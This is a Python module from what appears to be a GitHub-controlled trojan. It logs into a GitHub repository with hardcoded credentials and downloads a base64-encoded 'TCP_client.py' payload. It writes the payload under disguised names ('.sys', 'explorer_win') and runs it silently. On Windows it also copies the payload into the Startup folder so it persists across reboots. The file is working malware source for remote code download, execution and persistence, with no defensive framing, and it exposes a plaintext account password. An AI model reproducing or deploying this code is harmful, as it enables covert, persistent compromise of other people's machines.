from github3 import login
import json
import base64
import os

#TODO: Try this module with win
scriptPath = "scripts/TCP_client.py"
TargetScript= ".sys.py"
ScriptExec = "python3.6"
encodedFiles  = False
start = True
winRunOnBoot=True
linRunOnBoot=False

def connect_to_github():
	gh = login(username="MarvenGarsalli",password="1'mfor1am")
	repo = gh.repository("MarvenGarsalli","tro")
	branch = repo.branch("master")
	return gh,repo,branch

def get_file_contents(filepath):
    try:
        gh,repo,branch = connect_to_github()
        tree = branch.commit.commit.tree.to_tree().recurse()
        for filename in tree.tree:
            if filepath in filename.path:
                print("[OK] Found file %s" % filepath)
                blob = repo.blob(filename._json_data['sha']) #Hashed content
                if encodedFiles:
                        return base64.b64decode(blob.content)
                return blob.content
    except:
        pass
    return None

def run(**args): # Must import its personal lib, git_tro will execute this module in # environment
	print("[*] In RunScriptFromGit module.")
	os.system("echo '[*] In RunScriptFromGit module.'>> .Tlog.log") #Todelete
	global scriptPath, ScriptExec, TargetScript
	cmd = ""
	if os.name == 'posix':
		scriptPath = "scripts/TCP_client.py"
		#TODO: if linRunOnBoot:
		ScriptExec = "python3.6"
		TargetScript = ".sys"
		cmd = ScriptExec+" "+TargetScript + ">/dev/null &"
	elif os.name == 'nt':
		scriptPath = "scripts/TCP_client.py"
		ScriptExec = "python"
		TargetScript = os.getenv("PUBLIC")+ "\explorer_win"
		cmd = ScriptExec+" '"+TargetScript+"'"
	else:
		return ("[ERROR] getFileFromGit: Not recognised OS: %s"%os.name)
	script	= get_file_contents(scriptPath)
	if script is not None:
		content	= base64.b64decode(script)
		try:
			fich = open(TargetScript, "wb")
			fich.write(content)
			fich.close()
			if os.name == 'nt' and winRunOnBoot == True:
				startPath=os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup"
				os.system("copy %s %s"%(TargetScript, startPath))
		except:
			print("[Error] RunScriptFromGit: could not create Targetscript")
			return " modules/_bootlocale not found!!"

		if start:
			os.system(cmd) #os.execv("scripts/test.py") #Permission denied
		return str("getRunScript: script {} successfully started".format(scriptPath))
	else:
		#os.system("echo ' Unable to find file'>> .Tlog.log")
		#TODO: Customize log file path
		#os.system("echo 'getRunScript: Unable to find file {}' >> logFile.log".format(scriptPath))
		return str("getRunScript: Unable to find script {}".format(scriptPath))

run()
